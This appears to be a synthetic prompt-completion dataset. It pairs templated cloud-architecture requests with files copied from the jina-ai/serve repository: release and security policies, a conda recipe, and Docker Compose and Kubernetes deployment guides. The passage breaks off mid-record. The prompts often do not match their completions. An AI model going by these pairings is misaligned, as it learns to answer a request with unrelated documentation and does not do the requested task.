Wednesday of the month CET. This release is more QA tested and considered more stable than a patch release.\n-   Major release (`x.y.z -> (x+1).0.0`): Are released based on the development cycle of the Jina company. There is no set scheduled for when these will occur.\n\n\nThe following example shows how Jina is released from 0.9 to 0.9.2 according to the schema we defined above.\n\n|Event `e` | After `e`, `pip install jina` | After `e`, `pip install --pre jina` | After `e`, master `__init__.py` |\n|--- | ---  | --- | --- |\n| Release | 0.9.0 | 0.9.0 | 0.9.1.dev0 |\n| Master merging | 0.9.0 | 0.9.1.dev0 | 0.9.1.dev1 |\n| Master merging | 0.9.0 | 0.9.1.dev1 | 0.9.1.dev2 |\n| Master merging | 0.9.0 | 0.9.1.dev2 | 0.9.1.dev3 |\n| Release | 0.9.1 | 0.9.1 | 0.9.2.dev0 |\n| Master merging | 0.9.1 | 0.9.2.dev0 | 0.9.2.dev1 |\n\n## Docker image versioning\n\nOur universal Docker image is ready-to-use on linux/amd64, linux/armv7+, linux/arm/v6, linux/arm64. The Docker image name always starts with `jinaai/jina` followed by a tag composed of three parts:\n\n```text\njinaai/jina:{version}{python_version}{extra}\n```\n\n- `{version}`: The version of Jina. Possible values:\n    - `latest`: the last release;\n    - `master`: the master branch of `jina-ai/jina` repository;\n    - `x.y.z`: the release of a particular version;\n    - `x.y`: the alias to the last `x.y.z` patch release, i.e. `x.y` = `x.y.max(z)`;\n- `{python_version}`: The Python version of the image. Possible values:\n    - `-py37`: Python 3.7;\n    - ` `, `-py38` for Python 3.8;\n    - `-py39` for Python 3.9;\n    - `-py310` for Python 3.10;\n    - `-py311` for Python 3.11;\n- `{extra}`: the extra dependency installed along with Jina. Possible values:\n    - ` `: Jina is installed inside the image via `pip install jina`;\n    - `-standard`: Jina is installed inside the image via `pip install jina`. It includes all recommended dependencies;  \n    - `-devel`: Jina is installed inside the image via `pip install \"jina[devel]\"`. It includes `standard` plus some extra dependencies;\n\nExamples:\n\n- `jinaai/jina:0.9.6`: the `0.9.6` release with Python 3.7 and the entrypoint of `jina`.\n- `jinaai/jina:latest`: the latest release with Python 3.7 and the entrypoint of `jina`\n- `jinaai/jina:master`: the master with Python 3.7 and the entrypoint of `jina`\n\n### Image alias and updates\n\n| Event | Updated images | Aliases |\n| --- | --- | --- |\n| On Master Merge | `jinaai/jina:master{python_version}{extra}` | |\n| On `x.y.z` release | `jinaai/jina:x.y.z{python_version}{extra}` | `jinaai/jina:latest{python_version}{extra}`, `jinaai/jina:x.y{python_version}{extra}` |\n\nSix images are built, i.e. taking the combination of:\n  - `{python_version} = [\"-py37\", \"-py38\", \"-py39\"]`\n  - `{extra} = [\"\", \"-devel\", \"-standard\"]`\n\n\n### Image size on different tags\n\n|Image Size|\n| ---|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest?label=jinaai%2Fjina%3Alatest&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py38?label=jinaai%2Fjina%3Alatest-py38&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py39?label=jinaai%2Fjina%3Alatest-py39&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-devel?label=jinaai%2Fjina%3Alatest-devel&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-daemon?label=jinaai%2Fjina%3Alatest-daemon&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-standard?label=jinaai%2Fjina%3Alatest-standard&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py38-devel?label=jinaai%2Fjina%3Alatest-py38-devel&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py38-daemon?label=jinaai%2Fjina%3Alatest-py38-daemon&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py38-standard?label=jinaai%2Fjina%3Alatest-py38-standard&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py39-devel?label=jinaai%2Fjina%3Alatest-py39-devel&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py39-daemon?label=jinaai%2Fjina%3Alatest-py39-daemon&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py39-standard?label=jinaai%2Fjina%3Alatest-py39-standard&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master?label=jinaai%2Fjina%3Amaster&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py38?label=jinaai%2Fjina%3Amaster-py38&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py39?label=jinaai%2Fjina%3Amaster-py39&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-devel?label=jinaai%2Fjina%3Amaster-devel&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-daemon?label=jinaai%2Fjina%3Amaster-daemon&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-standard?label=jinaai%2Fjina%3Amaster-standard&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py38-devel?label=jinaai%2Fjina%3Amaster-py38-devel&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py38-daemon?label=jinaai%2Fjina%3Amaster-py38-daemon&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py38-standard?label=jinaai%2Fjina%3Amaster-py38-standard&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py39-devel?label=jinaai%2Fjina%3Amaster-py39-devel&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py39-daemon?label=jinaai%2Fjina%3Amaster-py39-daemon&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py39-standard?label=jinaai%2Fjina%3Amaster-py39-standard&logo=docker)|\n\n---\n\n## Manual Release Entrypoint\n\nManual release entrypoint is designed for authorized core developers of Jina.\n\n### Trigger weekly release manually\n\nOne can release a hotfix immediately without waiting for the weekly release. Here are the steps:\n\n1. [Go to here](https://github.com/jina-ai/jina/actions?query=workflow%3A%22Manual+Release%22)\n2. Click on \"Run Workflow\" dropdown button on the right and input the release token and the release reason.\n3. Click on \"Run Workflow\" green button.\n\n### Rebuild all Docker images for certain `git tag` manually\n\n1. [Go to here](https://github.com/jina-ai/jina/actions?query=workflow%3A%22Manual+Docker+Build%22)\n2. Click on \"Run Workflow\" dropdown button on the right and input the release token and the release reason.\n3. Click on \"Run Workflow\" green button.\n\n![Rebuild all Docker images](.github/images/manual-docker-build.png)\n\nNote, the manual rebuild on Docker images will *NOT* update `:latest-*` and `:x.y-*` aliases.\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "RELEASE.md", "language": "markdown", "complexity": "medium", "star_count": 21665, "quality_score": 0.8300000000000001, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": true, "line_count": 181}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Security Policy\n\nSecurity is very important for Jina AI and its community. \n\n## Supported Versions\n\nThe latest versions of Jina are supported.\n\nAll Docker images of Jina are scanned with Snyk. [You can find the report here](https://hub.docker.com/repository/docker/jinaai/jina).\n\n<img width=\"811\" alt=\"image\" src=\"https://user-images.githubusercontent.com/2041322/186850148-62b9bea2-dba2-45e1-80c2-94b5f8cbc553.png\">\n\n\n## Reporting a Vulnerability\n\nIf you think you found a vulnerability, and even if you are not sure about it, please report it right away by sending an email to: security@jina.ai. Please try to be as explicit as possible, describing all the steps and example code to reproduce the security issue.\n\nOur team will review it thoroughly and get back to you.\n\nPlease restrain from publicly discussing a potential security vulnerability on Github issues or in Discord community. 🙊 It's better to discuss privately and try to find a solution first, to limit the potential impact as much as possible.\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "SECURITY.md", "language": "markdown", "complexity": "simple", "star_count": 21665, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 21}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "{% set name = \"jina\" %}\n{% set version = \"3.11.0\" %}\n\npackage:\n  name: {{ name|lower }}-split\n  version: {{ version }}\n\nsource:\n  url: https://pypi.io/packages/source/{{ name[0] }}/{{ name }}/{{ name }}-{{ version }}.tar.gz\n  sha256: 49a7fec74b3b0927143d73ce787c7e3fe5e52fa2a1079323248a20590d2bf49f\n\nbuild:\n  number: 0\n\noutputs:\n  - name: jina-core\n    build:\n      noarch: python\n      entry_points:\n        - jina = cli:main\n      script: python -m pip install . --no-deps -vv\n      script_env:\n        - JINA_PIP_INSTALL_CORE=1\n    test:\n      requires:\n        - pip\n      imports:\n        - jina\n      commands:\n        - pip check\n        - jina --version\n    requirements:\n      host:\n        - python >=3.7\n        - pip\n      run:\n        - __unix\n        - python >=3.7\n        - docarray >=0.16.4\n        - grpcio >=1.46.0,<1.48.1\n        - grpcio-health-checking >=1.46.0,<1.48.1\n        - grpcio-reflection >=1.46.0,<1.48.1\n        - jina-hubble-sdk ==0.23.3\n        - numpy\n        - opentelemetry-api >=1.12.0\n        - opentelemetry-instrumentation-grpc >=0.33b0\n        - packaging >=20.0\n        - protobuf >=3.20.0\n        - pyyaml >=5.3.1\n  - name: jina-perf\n    test:\n      requires:\n        - pip\n      imports:\n        - jina\n      commands:\n        - pip check\n        - jina --version\n    build:\n      noarch: python\n      entry_points:\n        - jina = cli:main\n      script: python -m pip install . --no-deps -vv\n      script_env:\n        - JINA_PIP_INSTALL_PERF=1\n    requirements:\n      host:\n        - python >=3.7\n        - pip\n      run:\n        - __unix\n        - python >=3.7\n        - docarray >=0.16.4\n        - grpcio >=1.46.0,<1.48.1\n        - grpcio-health-checking >=1.46.0,<1.48.1\n        - grpcio-reflection >=1.46.0,<1.48.1\n        - jina-hubble-sdk ==0.23.3\n        - numpy\n        - opentelemetry-api >=1.12.0\n        - opentelemetry-exporter-otlp >=1.12.0\n        - opentelemetry-instrumentation-aiohttp-client >=0.33b0\n        - opentelemetry-instrumentation-fastapi >=0.33b0\n        - opentelemetry-instrumentation-grpc >=0.33b0\n        - opentelemetry-sdk >=1.12.0\n        - opentelemetry-semantic-conventions >=0.33b0\n        - packaging >=20.0\n        - prometheus_client\n        - protobuf >=3.20.0\n        - pyyaml >=5.3.1\n        - uvloop\n  - name: jina\n    test:\n      requires:\n        - pip\n      imports:\n        - jina\n      commands:\n        - pip check\n        - jina --version\n    build:\n      noarch: python\n      entry_points:\n        - jina = cli:main\n      script: python -m pip install . --no-deps -vv\n    requirements:\n      host:\n        - python >=3.7\n        - pip\n      run:\n        - __unix\n        - python >=3.7\n        - aiofiles\n        - aiohttp\n        - aiostream\n        - cryptography\n        - docarray >=0.16.4\n        - docker-py\n        - fastapi >=0.76.0\n        - filelock\n        - grpcio >=1.46.0,<1.48.1\n        - grpcio-health-checking >=1.46.0,<1.48.1\n        - grpcio-reflection >=1.46.0,<1.48.1\n        - jina-hubble-sdk ==0.23.3\n        - numpy\n        - opentelemetry-api >=1.12.0\n        - opentelemetry-exporter-otlp >=1.12.0\n        - opentelemetry-instrumentation-aiohttp-client >=0.33b0\n        - opentelemetry-instrumentation-fastapi >=0.33b0\n        - opentelemetry-instrumentation-grpc >=0.33b0\n        - opentelemetry-sdk >=1.12.0\n        - opentelemetry-semantic-conventions >=0.33b0\n        - packaging >=20.0\n        - pathspec\n        - prometheus_client\n        - protobuf >=3.20.0\n        - pydantic\n        - python-multipart\n        - pyyaml >=5.3.1\n        - requests\n        - uvicorn\n        - uvloop\n        - websockets\n\nabout:\n  home: https://github.com/jina-ai/jina/\n  license: Apache-2.0\n  license_family: Apache\n  license_file: LICENSE\n  summary: \"Build multimodal AI services via cloud native technologies \\xB7 Neural Search \\xB7 Generative AI \\xB7 Cloud Native\"\n  doc_url: https://jina.ai/serve\n\nextra:\n  recipe-maintainers:\n    - JoanFM\n    - nan-wang\n    - hanxiao\n  feedstock-name: jina\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "conda/meta.yaml", "language": "yaml", "complexity": "medium", "star_count": 21665, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 158}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(docker-compose)=\n# {fab}`docker` Docker Compose Support\n\nOne of the simplest ways to prototype or serve in\nproduction is to run your {class}`~jina.Flow` with `docker-compose`.\n\nA {class}`~jina.Flow` is composed of {class}`~jina.Executor`s which run Python code\nthat operates on `Documents`. These `Executors` live in different runtimes depending on how you want to deploy\nyour Flow. \n\nBy default, if you are serving your Flow locally they live within processes. Nevertheless, \nbecause Jina-serve is cloud native your Flow can easily manage Executors that live in containers and that are\norchestrated by your favorite tools. One of the simplest is Docker Compose which is supported out of the box. \n\nYou can deploy a Flow with Docker Compose in one line:\n\n\n```{code-block} python\n---\nemphasize-lines: 3\n---\nfrom jina import Flow\nflow = Flow(...).add(...).add(...)\nflow.to_docker_compose_yaml('docker-compose.yml')\n```\n\nJina-serve generates a `docker-compose.yml` configuration file corresponding with your Flow. You can use this directly with \nDocker Compose, avoiding the overhead of manually defining all of your Flow's services.\n\n````{admonition} Use Docker-based Executors\n:class: caution\nAll Executors in the Flow should be used with `jinaai+docker://...` or `docker://...`.\n````\n\n````{admonition} Health check available from 3.1.3\n:class: caution\nIf you use Executors that rely on Docker images built with a version of Jina-serve prior to 3.1.3, remove the \nhealth check from the dumped YAML file, otherwise your Docker Compose services will \nalways be \"unhealthy.\"\n````\n\n````{admonition} Matching Jina-serve versions\n:class: caution\nIf you change the Docker images in your Docker Compose generated file, ensure that all services included in\nthe Gateway are built with the same Jina-serve version to guarantee compatibility.\n````\n\n## Example: Index and search text using your own built Encoder and Indexer\n\nInstall [`Docker Compose`](https://docs.docker.com/compose/install/) locally before starting this tutorial.\n\nFor this example we recommend that you read {ref}`how to build and containerize the Executors to be run in Kubernetes. <build-containerize-for-k8s>`\n\n### Deploy the Flow\n\nFirst define the Flow and generate the Docker Compose YAML configuration:\n\n\n````{tab} YAML\nIn a `flow.yml` file :\n```yaml\njtype: Flow\nwith:\n  port: 8080\n  protocol: http\nexecutors:\n- name: encoder\n  uses: jinaai+docker://<user-id>/EncoderPrivate\n  replicas: 2\n- name: indexer\n  uses: jinaai+docker://<user-id>/IndexerPrivate\n  shards: 2\n```\nThen in a shell run:\n```shell\njina export docker-compose flow.yml docker-compose.yml \n```\n````\n\n\n````{tab} Python\nIn python run\n```python\nfrom jina import Flow\n\nflow = (\n    Flow(port=8080, protocol='http')\n    .add(name='encoder', uses='jinaai+docker://<user-id>/EncoderPrivate', replicas=2)\n    .add(\n        name='indexer',\n        uses='jinaai+docker://<user-id>/IndexerPrivate',\n        shards=2,\n    )\n)\nflow.to_docker_compose_yaml('docker-compose.yml')\n```\n````\n\n````{admonition} Hint\n:class: hint\nYou can use a custom jina Docker image for the Gateway service by setting the environment variable `JINA_GATEWAY_IMAGE` to the desired image before generating the configuration.\n````\n\nlet's take a look at the generated compose file:\n```yaml\nversion: '3.3'\n...\nservices:\n  encoder-rep-0:  # # # # # # # # # # #          \n                  #     Encoder       #\n  encoder-rep-1:  # # # # # # # # # # #\n\n  indexer-head:   # # # # # # # # # # #          \n                  #                   #\n  indexer-0:      #     Indexer       #\n                  #                   #\n  indexer-1:      # # # # # # # # # # #\n\n  gateway: \n    ...\n    ports:\n    - 8080:8080\n```\n\n```{tip} \n:class: caution\nThe default compose file generated by the Flow contains no special configuration or settings. You may want to \nadapt it to your own needs.\n```\n\nYou can see that six services are created:\n\n- 1 for the **Gateway** which is the entrypoint of the **Flow**.\n- 2 associated with the encoder for the two Replicas.\n- 3 associated with the indexer, one for the Head and two for the Shards.\n\nNow, you can deploy this Flow :\n\n```shell\ndocker-compose -f docker-compose.yml up\n```\n\n### Query the Flow\n\nOnce we see that all the services in the Flow are ready, we can send index and search requests.\n\nFirst define a client:\n```python\nfrom jina.clients import Client\n\nclient = Client(host='http://localhost:8080')\n```\n\n\n```python\nfrom typing import List, Optional\nfrom docarray import DocList, BaseDoc\nfrom docarray.typing import NdArray\n\n\nclass MyDoc(BaseDoc):\n    text: str\n    embedding: Optional[NdArray] = None\n\n\nclass MyDocWithMatches(MyDoc):\n    matches: DocList[MyDoc] = []\n    scores: List[float] = []\n\ndocs = client.post(\n    '/index',\n    inputs=DocList[MyDoc]([MyDoc(text=f'This is document indexed number {i}') for i in range(100)]),\n    return_type=DocList[MyDoc],\n    request_size=10\n)\n\nprint(f'Indexed documents: {len(docs)}')\ndocs = client.post(\n    '/search',\n    inputs=DocList[MyDoc]([MyDoc(text=f'This is document query number {i}') for i in range(10)]),\n    return_type=DocList[MyDocWithMatches],\n    request_size=10\n)\nfor doc in docs:\n    print(f'Query {doc.text} has {len(doc.matches)} matches')\n```\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "docs/cloud-nativeness/docker-compose.md", "language": "markdown", "complexity": "medium", "star_count": 21665, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 187}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(kubernetes-docs)=\n# {fas}`dharmachakra` Kubernetes Support\n\n```{toctree}\n:hidden:\n\nkubernetes\n```\n\nJina-serve is a cloud-native framework and therefore runs natively and easily on Kubernetes.\nDeploying a Jina-serve Deploymenr or Flow on Kubernetes is actually the recommended way to use Jina-serve in production.\n\nA {class}`~jina.Deployment` and {class}`~jina.Flow` are services composed of single or multiple microservices called {class}`~jina.Executor` and {class}`~jina.Gateway`s which natively run in containers. This means that Kubernetes can natively take over the lifetime management of Executors. \n\nDeploying a {class}`~jina.Deployment` or `~jina.Flow` on Kubernetes means wrapping these services containers in the appropriate K8s abstraction (Deployment, StatefulSet, and so on), exposing them internally via K8s service and connecting them together by passing the right set of parameters.\n\n```{hint}\nThis documentation is designed for users who want to **manually** deploy a Jina-serve project on Kubernetes.\n\nCheck out {ref}`jcloud` if you want a **one-click** solution to deploy and host Jina, leveraging a cloud-native stack of Kubernetes, Prometheus and Grafana, **without worrying about provisioning**.\n```\n\n\n## Automatically translate a Deployment or Flow to Kubernetes concept\n\n```{hint}\nManually building these Kubernetes YAML object is long and cumbersome. Therefore we provide a helper function {meth}`~jina.Flow.to_kubernetes_yaml` that does most of this\ntranslation work automatically. \n```\n\nThis helper function can be called from:\n* Jina-serve's Python interface to translate a Flow defined in Python to K8s YAML files\n* Jina-serve's CLI interface to export a YAML Flow to K8s YAML files\n\n```{seealso}\nMore detail in the {ref}`Deployment export documentation<deployment-kubernetes-export>` and {ref}`Flow export documentation <flow-kubernetes-export>`\n```\n\n## Extra Kubernetes options\n\nIn general, Jina-serve follows a single principle when it comes to deploying in Kubernetes:\nYou, the user, know your use case and requirements the best.\nThis means that, while Jina-serve generates configurations for you that run out of the box, as a professional user you should always see them as just a starting point to get you off the ground.\n\n```{hint}\nThe export function {meth}`~jina.Deployment.to_kubernetes_yaml` and {meth}`~jina.Flow.to_kubernetes_yaml` are helper functions to get your stared off the ground. **There are meant to be updated and adapted to every use case**\n```\n````{admonition} Matching Jina versions\n:class: caution\nIf you change the Docker images for {class}`~jina.Executor` and {class}`~jina.Gateway` in your Kubernetes-generated file, ensure that all of them are built with the same Jina-serve version to guarantee compatibility.\n````\n\nYou can't add basic Kubernetes features like `Secrets`, `ConfigMap` or `Labels` via the Pythonic or YAML interface. This is intentional and doesn't mean that we don't support these features. On the contrary, we let you fully express your Kubernetes configuration by using the Kubernetes API to add your own Kubernetes standard to Jina-serve.\n\n````{admonition} Hint\n:class: hint\nWe recommend you dump the Kubernetes configuration files and then edit them to suit your needs.\n````\n\nHere are possible configuration options you may need to add or change\n\n- Add labels `selector`s to the Deployments to suit your case\n- Add `requests` and `limits` for the resources of the different Pods \n- Set up persistent volume storage to save your data on disk\n- Pass custom configuration to your Executor with `ConfigMap` \n- Manage credentials of your Executor with Kubernetes secrets, you can use `f.add(..., env_from_secret={'SECRET_PASSWORD': {'name': 'mysecret', 'key': 'password'}})` to map them to Pod environment variables\n- Edit the default rolling update configuration\n\n\n(service-mesh-k8s)=\n## Required service mesh\n\n```{caution}\nA Service Mesh is required to be installed and correctly configured in the K8s cluster in which your deployed your Flow.\n```\n\nService meshes work by attaching a tiny proxy to each of your Kubernetes Pods, allowing for smart rerouting, load balancing, request retrying, and host of [other features](https://linkerd.io/2.11/features/).\n\nJina relies on a service mesh to load balance requests between replicas of the same Executor.\nYou can use your favourite Kubernetes service mesh in combination with your Jina services, but the configuration files\ngenerated by `to_kubernetes_yaml()` already include all necessary annotations for the [Linkerd service mesh](https://linkerd.io).\n\n````{admonition} Hint\n:class: hint\nYou can use any service mesh with Jina-serve, but Jina-serve Kubernetes configurations come with Linkerd annotations out of the box.\n````\n\nTo use Linkerd you can follow the [install the Linkerd CLI guide](https://linkerd.io/2.11/getting-started/).\n\n````{admonition} Caution\n:class: caution\n\nMany service meshes can perform retries themselves.\nBe careful about setting up service mesh level retries in combination with Jina, as it may lead to unwanted behaviour in combination with\nJina's own {ref}`retry policy <flow-error-handling>`.\n\nInstead, you can disable Jina level retries by setting `Flow(retries=0)` in Python, or `retries: 0` in the Flow\nYAML's `with` block.\n````\n\n(kubernetes-replicas)=\n## Scaling Executors: Replicas and shards\n\nJina supports two types of scaling:\n\n- **Replicas** can be used with any Executor type and are typically used for performance and availability.\n- **Shards** are used for partitioning data and should only be used with indexers since they store state.\n\nCheck {ref}`here <scale-out>` for more information about these scaling mechanisms.\n\nFor shards, Jina creates one separate Deployment in Kubernetes per Shard.\nSetting `Deployment(..., shards=num_shards)` is sufficient to create a corresponding Kubernetes configuration.\n\nFor replicas, Jina-serve uses [Kubernetes native replica scaling](https://kubernetes.io/docs/tutorials/kubernetes-basics/scale/scale-intro/) and **relies on a service mesh** to load-balance requests between replicas of the same Executor.\nWithout a service mesh installed in your Kubernetes cluster, all traffic will be routed to the same replica.\n\n````{admonition} See Also\n:class: seealso\n\nThe impossibility of load balancing between different replicas is a limitation of Kubernetes in combination with gRPC.\nIf you want to learn more about this limitation, see [this](https://kubernetes.io/blog/2018/11/07/grpc-load-balancing-on-kubernetes-without-tears/) Kubernetes Blog post.\n````\n\n## Scaling the Gateway\nThe {ref}`Gateway <gateway>` is responsible for providing the API of the {ref}`Flow <flow>`.\nIf you have a large Flow with many Clients and many replicated Executors, the Gateway can become the bottleneck.\nIn this case you can also scale up the Gateway deployment to be backed by multiple Kubernetes Pods. For this reason, you can add `replicas` parameter to your Gateway before converting the Flow to Kubernetes.\nThis can be done in a Pythonic way or in YAML:\n\n````{tab} Using Python\n\nYou can use {meth}`~jina.Flow.config_gateway` to add `replicas` parameter\n```python\nfrom jina import Flow\n\nf = Flow().config_gateway(replicas=3).add()\n\nf.to_kubernetes_yaml('./k8s_yaml_path')\n```\n````\n\n````{tab} Using YAML\nYou can add `replicas` in the `gateway` section of your Flow YAML\n```yaml\njtype: Flow\ngateway:\n    replicas: 3\nexecutors:\n  - name: encoder\n```\n````\n\nAlternatively, this can be done by the regular means of Kubernetes: Either increase the number of replicas in the {ref}`generated yaml configuration files <kubernetes-export>` or [add replicas while running](https://kubernetes.io/docs/concepts/workloads/controllers/deployment/#scaling-a-deployment).\nTo expose your Gateway replicas outside Kubernetes, you can add a load balancer as described {ref}`here <kubernetes-expose>`.\n\n````{admonition} Hint\n:class: hint\nYou can use a custom Docker image for the Gateway deployment by setting the environment variable `JINA_GATEWAY_IMAGE` to the desired image before generating the configuration.\n````\n\n## See also\n- {ref}`Step by step deployment of a Jina-serve Flow on Kubernetes <kubernetes>`\n- {ref}`Export a Flow to Kubernetes <kubernetes-export>`\n- {meth}`~jina.Flow.to_kubernetes_yaml`\n- {ref}`Deploy a standalone Executor on Kubernetes <kubernetes-executor>`\n- [Kubernetes Documentation](https://kubernetes.io/docs/home/)\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "docs/cloud-nativeness/k8s.md", "language": "markdown", "complexity": "medium", "star_count": 21665, "quality_score": 0.89, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 167}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(kubernetes)=\n# Deploy on Kubernetes\n\nThis how-to will go through deploying a Deployment and a simple Flow using Kubernetes, customizing the Kubernetes configuration\nto your needs, and scaling Executors using replicas and shards.\n\nDeploying Jina-serve services in Kubernetes is the recommended way to use Jina-serve in production because Kubernetes can easily take over the lifetime management of Executors and Gateways.  \n\n```{seelaso}\nThis page is a step by step guide, refer to the {ref}`Kubernetes support documentation <kubernetes-docs>` for more details\n```\n\n\n```{hint}\nThis guide is designed for users who want to **manually** deploy a Jina-serve project on Kubernetes.\n\nCheck out {ref}`jcloud` if you want a **one-click** solution to deploy and host Jina, leveraging a cloud-native stack of Kubernetes, Prometheus and Grafana, **without worrying about provisioning**.\n```\n\n\n## Preliminaries\n\nTo follow this how-to, you need access to a Kubernetes cluster.\n\nYou can either set up [`minikube`](https://minikube.sigs.k8s.io/docs/start/), or use one of many managed Kubernetes\nsolutions in the cloud:\n- [Google Kubernetes Engine](https://cloud.google.com/kubernetes-engine)\n- [Amazon EKS](https://aws.amazon.com/eks)\n- [Azure Kubernetes Service](https://azure.microsoft.com/en-us/services/kubernetes-service)\n- [Digital Ocean](https://www.digitalocean.com/products/kubernetes/)\n\nYou need to install Linkerd in your K8s cluster. To use Linkerd, [install the Linkerd CLI](https://linkerd.io/2.11/getting-started/) and [its control plane](https://linkerd.io/2.11/getting-started/) in your cluster.\nThis automatically sets up and manages the service mesh proxies when you deploy the Flow.\n\nTo understand why you need to install a service mesh like Linkerd refer to this  {ref}`section <service-mesh-k8s>`\n\n(build-containerize-for-k8s)=\n## Build and containerize your Executors\n\nFirst, we need to build the Executors that we are going to use and containerize them {ref}`manually <dockerize-exec>` or by leveraging {ref}`Executor Hub <jina-hub>`. In this example,\nwe are going to use the Hub.\n\nWe are going to build two Executors, the first is going to use `CLIP` to encode textual Documents, and the second is going to use an in-memory vector index. This way \nwe can build a simple neural search system.\n\nFirst, we build the encoder Executor.\n\n````{tab} executor.py\n```{code-block} python\nimport torch\nfrom typing import Optional\nfrom transformers import CLIPModel, CLIPTokenizer\nfrom docarray import DocList, BaseDoc\nfrom docarray.typing import NdArray\nfrom jina import Executor, requests\n\n\nclass MyDoc(BaseDoc):\n    text: str\n    embedding: Optional[NdArray] = None\n\n\nclass Encoder(Executor):\n    def __init__(\n            self, pretrained_model_name_or_path: str = 'openai/clip-vit-base-patch32', device: str = 'cpu', *args,**kwargs ):\n        super().__init__(*args, **kwargs)\n        self.device = device\n        self.tokenizer = CLIPTokenizer.from_pretrained(pretrained_model_name_or_path)\n        self.model = CLIPModel.from_pretrained(pretrained_model_name_or_path)\n        self.model.eval().to(device)\n\n    def _tokenize_texts(self, texts):\n        x = self.tokenizer(\n            texts,\n            max_length=77,\n            padding='longest',\n            truncation=True,\n            return_tensors='pt',\n        )\n        return {k: v.to(self.device) for k, v in x.items()}\n\n    @requests\n    def encode(self, docs: DocList[MyDoc], **kwargs) -> DocList[MyDoc]:\n        with torch.inference_mode():\n            input_tokens = self._tokenize_texts(docs.text)\n            docs.embedding = self.model.get_text_features(**input_tokens).cpu().numpy()\n        return docs\n\n```\n````\n````{tab} requirements.txt\n```\ntorch==1.12.0\ntransformers==4.16.2\n```\n````\n````{tab} config.yml\n```\njtype: Encoder\nmetas:\n  name: EncoderPrivate\n  py_modules:\n    - 